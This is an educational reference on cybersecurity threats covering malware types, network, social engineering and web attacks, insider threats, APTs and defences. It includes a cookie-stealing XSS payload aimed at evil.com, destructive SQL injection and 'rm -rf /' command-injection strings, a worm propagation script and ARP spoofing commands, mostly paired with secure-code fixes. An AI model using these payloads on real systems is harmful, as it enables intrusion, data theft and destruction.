# Cybersecurity Threats

## Table of Contents

1. [Threat Landscape Overview](#threat-landscape-overview)
2. [Malware Types](#malware-types)
3. [Network Attacks](#network-attacks)
4. [Social Engineering](#social-engineering)
5. [Web Application Attacks](#web-application-attacks)
6. [Insider Threats](#insider-threats)
7. [Advanced Persistent Threats](#advanced-persistent-threats)
8. [Emerging Threats](#emerging-threats)

---

## Threat Landscape Overview

### Threat Actors

```
┌─────────────────────────────────────────────────────┐
│                  THREAT ACTORS                       │
├─────────────────┬─────────────────┬─────────────────┤
│   Nation-State  │  Cybercriminals │  Hacktivists    │
│   • Espionage   │  • Financial    │  • Political    │
│   • Sabotage    │  • Ransomware   │  • Ideological  │
│   • Warfare     │  • Fraud        │  • Anonymous    │
├─────────────────┼─────────────────┼─────────────────┤
│  Insider Threats│  Script Kiddies │  Terrorists     │
│  • Malicious    │  • Tools-based  │  • Disruption   │
│  • Negligent    │  • Low skill    │  • Fear         │
│  • Compromised  │  • Opportunistic│  • Extremism    │
└─────────────────┴─────────────────┴─────────────────┘
```

### Attack Vectors

| Vector | Description | Prevalence |
|--------|-------------|------------|
| Email | Phishing, malware delivery | 91% |
| Web | Drive-by downloads, exploits | 78% |
| Removable Media | USB drops, infected devices | 45% |
| Supply Chain | Compromised vendors | 62% |
| Cloud | Misconfigurations, API abuse | 55% |

---

## Malware Types

### 1. Viruses

```python
# Conceptual virus behavior (for educational purposes)
def virus_behavior():
    # Attach to host file
    host_file = find_target_file()
    append_code_to_file(host_file)
    
    # Replicate to other files
    for file in get_all_files():
        if not_infected(file):
            infect(file)
    
    # Trigger condition
    if trigger_condition_met():
        execute_payload()
```

**Characteristics:**
- Requires host program
- Spreads through file sharing
- Can corrupt or delete data
- Needs user action to spread

### 2. Worms

```bash
# Worm propagation concept
#!/bin/bash
# Educational example only

# Scan for vulnerable hosts
targets=$(nmap -p 22 --open 192.168.1.0/24 | grep "Nmap scan")

# Attempt propagation
for target in $targets; do
    ssh-copy-id -i malicious_key.pub user@$target
    scp worm.sh user@$target:/tmp/
    ssh user@$target "bash /tmp/worm.sh"
done
```

**Characteristics:**
- Self-propagating
- No host file needed
- Spreads through networks
- Can consume bandwidth

### 3. Trojans

| Type | Disguise | Purpose |
|------|----------|---------|
| RAT | Legitimate software | Remote access |
| Banker | Banking app | Credential theft |
| Keylogger | Utility program | Input capture |
| Backdoor | System tool | Persistent access |
| Downloader | Free software | Additional malware |

### 4. Ransomware

```
Ransomware Kill Chain:

1. Initial Access → Phishing, Exploit, RDP
         ↓
2. Execution → Payload runs, establishes persistence
         ↓
3. Privilege Escalation → Gains admin rights
         ↓
4. Reconnaissance → Maps network, finds data
         ↓
5. Exfiltration → Steals data (double extortion)
         ↓
6. Lateral Movement → Spreads across network
         ↓
7. Encryption → Files encrypted with strong cipher
         ↓
8. Ransom Note → Payment demanded
```

**Notable Ransomware Families:**
- WannaCry
- NotPetya
- Ryuk
- Conti
- LockBit
- REvil

### 5. Spyware

```python
# Spyware capabilities (educational)
spyware_features = {
    "keylogging": "Records keystrokes",
    "screen_capture": "Takes screenshots",
    "web_monitoring": "Tracks browsing",
    "credential_harvest": "Steals passwords",
    "file_collection": "Gathers documents",
    "communication_monitor": "Reads emails/chats"
}
```

### 6. Adware

**Characteristics:**
- Displays unwanted advertisements
- Browser hijacking
- Redirects searches
- Collects browsing data
- Often bundled with free software

### 7. Rootkits

```
Rootkit Types:

User-mode:    Hooks system calls
              ↓
Kernel-mode:  Modifies kernel
              ↓
Bootkit:      Infects boot process
              ↓
Hypervisor:   Virtualizes system
              ↓
Firmware:     Infects BIOS/UEFI
```

---

## Network Attacks

### 1. Man-in-the-Middle (MitM)

```
Normal Communication:
Alice ──────────────────────── Bob

MitM Attack:
Alice ────────► Attacker ────────► Bob
       ◄─────── Attacker ◄───────
```

**Attack Methods:**
- ARP Spoofing
- DNS Poisoning
- SSL Stripping
- Session Hijacking

```bash
# ARP spoofing example (educational)
# Using arpspoof tool
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 2. DDoS Attacks

| Type | Method | Target |
|------|--------|--------|
| Volumetric | UDP flood, ICMP flood | Bandwidth |
| Protocol | SYN flood, Ping of Death | Resources |
| Application | HTTP flood, Slowloris | Application |

```python
# SYN flood concept (educational only)
def syn_flood_concept():
    # Create raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    # Craft SYN packet
    ip_header = create_ip_header(source_ip, target_ip)
    tcp_header = create_tcp_header(source_port, target_port, flags="S")
    
    # Send flood of packets
    for i in range(packet_count):
        packet = ip_header + tcp_header
        sock.sendto(packet, (target_ip, 0))
```

### 3. DNS Attacks

```bash
# DNS cache poisoning concept
# Modify DNS responses

# Local DNS spoofing
echo "192.168.1.100 target.com" >> /etc/hosts

# dnsmasq configuration (malicious)
address=/target.com/192.168.1.100
```

### 4. Wireless Attacks

| Attack | Description | Defense |
|--------|-------------|---------|
| Evil Twin | Fake access point | Certificate validation |
| Deauth | Disconnect clients | 802.11w (PMF) |
| KRACK | WPA2 key reinstallation | Updated firmware |
| WPS Attack | Brute force PIN | Disable WPS |
| Packet Sniffing | Intercept traffic | WPA3, VPN |

### 5. Password Attacks

```python
# Brute force concept
def brute_force_concept(hashed_password, charset, max_length):
    import itertools
    
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            if hash(candidate) == hashed_password:
                return candidate
    return None

# Dictionary attack
def dictionary_attack(hashed_password, wordlist):
    with open(wordlist, 'r') as f:
        for word in f:
            word = word.strip()
            if hash(word) == hashed_password:
                return word
    return None
```

---

## Social Engineering

### Attack Types

```
┌─────────────────────────────────────────────────────┐
│              SOCIAL ENGINEERING                      │
├───────────────────┬─────────────────────────────────┤
│    Pretexting     │ Create fake scenario            │
│    Phishing       │ Email-based deception           │
│    Spear Phishing │ Targeted phishing               │
│    Vishing        │ Voice-based phishing            │
│    Smishing       │ SMS-based phishing              │
│    Baiting        │ Leave infected media            │
│    Quid Pro Quo   │ Offer service for info          │
│    Tailgating     │ Follow authorized person        │
│    Pharming       │ Redirect to fake site           │
└───────────────────┴─────────────────────────────────┘
```

### Phishing Indicators

```python
def check_phishing_indicators(email):
    indicators = {
        "urgency": ["act now", "immediately", "expires"],
        "threats": ["account suspended", "legal action"],
        "spoofed": ["paypa1", "amaz0n", "micros0ft"],
        "requests": ["verify account", "confirm password"],
        "attachments": [".exe", ".scr", ".zip"],
        "links": ["bit.ly", "tinyurl", "hover to reveal"]
    }
    
    score = 0
    email_lower = email.lower()
    
    for category, keywords in indicators.items():
        for keyword in keywords:
            if keyword in email_lower:
                score += 1
    
    return score
```

### Social Engineering Red Flags

- [ ] Unexpected contact from unknown sender
- [ ] Urgency or pressure to act quickly
- [ ] Requests for sensitive information
- [ ] Too good to be true offers
- [ ] Emotional manipulation (fear, curiosity)
- [ ] Authority impersonation
- [ ] Poor grammar or spelling
- [ ] Suspicious links or attachments

---

## Web Application Attacks

### 1. SQL Injection

```python
# Vulnerable code
def vulnerable_query(user_id):
    query = f"SELECT * FROM users WHERE id = '{user_id}'"
    cursor.execute(query)

# Secure code
def secure_query(user_id):
    query = "SELECT * FROM users WHERE id = %s"
    cursor.execute(query, (user_id,))
```

**SQL Injection Payloads:**
```sql
' OR '1'='1
' UNION SELECT username, password FROM users--
'; DROP TABLE users;--
' AND (SELECT COUNT(*) FROM users) > 0--
```

### 2. Cross-Site Scripting (XSS)

```javascript
// Stored XSS example
// Malicious input
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

// Reflected XSS
https://example.com/search?q=<script>alert('XSS')</script>

// DOM-based XSS
<img src=x onerror="stealCookies()">
```

**XSS Prevention:**
```javascript
// Encode output
function encodeHTML(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#39;');
}

// Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 3. Cross-Site Request Forgery (CSRF)

```python
# CSRF attack concept
# Attacker creates malicious page:
"""
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
"""

# CSRF prevention
import secrets

def generate_csrf_token():
    return secrets.token_hex(32)

# Include in forms
# <input type="hidden" name="csrf_token" value="{{ token }}">
```

### 4. Remote Code Execution

```python
# Vulnerable code (command injection)
def ping_host(hostname):
    import os
    os.system(f"ping -c 4 {hostname}")

# User input: "127.0.0.1; rm -rf /"

# Secure code
def safe_ping(hostname):
    import subprocess
    import re
    
    if not re.match(r'^[\d\.]+$', hostname):
        raise ValueError("Invalid hostname")
    
    result = subprocess.run(
        ['ping', '-c', '4', hostname],
        capture_output=True,
        text=True
    )
    return result.stdout
```

---

## Insider Threats

### Types of Insider Threats

| Type | Motivation | Indicators |
|------|------------|------------|
| Malicious | Revenge, profit | Unusual access, data exfil |
| Negligent | Carelessness | Policy violations, errors |
| Compromised | Coerced | Behavioral changes |
| Third-party | Vendor access | Excessive permissions |

### Detection Signals

```python
insider_threat_indicators = {
    "access_patterns": [
        "Accessing files outside normal hours",
        "Bulk downloading sensitive data",
        "Accessing unauthorized systems",
        "Using disabled accounts"
    ],
    "behavioral": [
        "Unusual work schedule",
        "Expressing disgruntlement",
        "Financial difficulties",
        "Resistance to oversight"
    ],
    "technical": [
        "USB device usage",
        "Email forwarding to personal",
        "Cloud storage uploads",
        "Encryption tool usage"
    ]
}
```

---

## Advanced Persistent Threats (APT)

### APT Lifecycle

```
┌────────────────────────────────────────────────────────┐
│                    APT KILL CHAIN                       │
├────────────────────────────────────────────────────────┤
│ 1. Reconnaissance → Target identification              │
│ 2. Weaponization → Create exploit/payload              │
│ 3. Delivery → Spear phishing, watering hole            │
│ 4. Exploitation → Vulnerability exploitation           │
│ 5. Installation → Backdoor, persistent access          │
│ 6. Command & Control → C2 communication                │
│ 7. Actions on Objectives → Data theft, sabotage        │
└────────────────────────────────────────────────────────┘
```

### Notable APT Groups

| Group | Origin | Targets |
|-------|--------|---------|
| APT28 (Fancy Bear) | Russia | Government, Military |
| APT29 (Cozy Bear) | Russia | Government, Tech |
| APT1 | China | US Corporations |
| Lazarus Group | North Korea | Financial, Crypto |
| Equation Group | USA | Global surveillance |

---

## Emerging Threats

### AI-Powered Attacks

```python
ai_threats = {
    "deepfakes": "Realistic fake videos/audio for fraud",
    "ai_phishing": "Automated, personalized phishing",
    "adversarial_ml": "Evade security AI systems",
    "autonomous_malware": "Self-evolving malware",
    "voice_cloning": "Impersonation via voice synthesis"
}
```

### IoT Threats

```
IoT Attack Surface:

┌─────────────┐
│  Smart Home │ → Camera hacking, voice assistants
├─────────────┤
│  Medical    │ → Patient data, device manipulation
├─────────────┤
│  Industrial │ → SCADA attacks, process disruption
├─────────────┤
│  Vehicles   │ → Remote hijacking, sensor spoofing
├─────────────┤
│  Wearables  │ → Health data theft, tracking
└─────────────┘
```

### Supply Chain Attacks

```python
supply_chain_risks = {
    "software_deps": "Compromised packages (SolarWinds)",
    "hardware": "Chip-level backdoors",
    "ci_cd": "Build pipeline compromise",
    "vendor_access": "Third-party breaches",
    "update_mechanism": "Malicious updates"
}
```

---

## Threat Mitigation Strategies

### Defensive Measures Matrix

| Threat | Prevention | Detection | Response |
|--------|------------|-----------|----------|
| Malware | AV, EDR | Behavioral analysis | Quarantine, clean |
| Phishing | Training, filters | URL analysis | Block, report |
| DDoS | CDN, rate limiting | Traffic analysis | Mitigate, scale |
| Insider | Least privilege | UEBA | Investigate, terminate |
| APT | Defense in depth | Threat hunting | Incident response |

### Security Controls

```
Technical Controls:
├── Firewalls
├── IDS/IPS
├── Encryption
├── MFA
├── EDR/XDR
└── SIEM

Administrative Controls:
├── Policies
├── Training
├── Background checks
├── Incident response
└── Risk assessments

Physical Controls:
├── Access badges
├── Cameras
├── Locks
├── Environmental controls
└── Secure areas
```

---

## Quick Reference: Common Ports & Attacks

| Port | Service | Common Attack |
|------|---------|---------------|
| 21 | FTP | Brute force, anonymous login |
| 22 | SSH | Brute force, key exploitation |
| 23 | Telnet | Sniffing, brute force |
| 53 | DNS | Amplification, poisoning |
| 80 | HTTP | XSS, injection |
| 443 | HTTPS | SSL stripping, downgrade |
| 445 | SMB | EternalBlue, ransomware |
| 3389 | RDP | Brute force, BlueKeep |

---

*Last Updated: 2024*
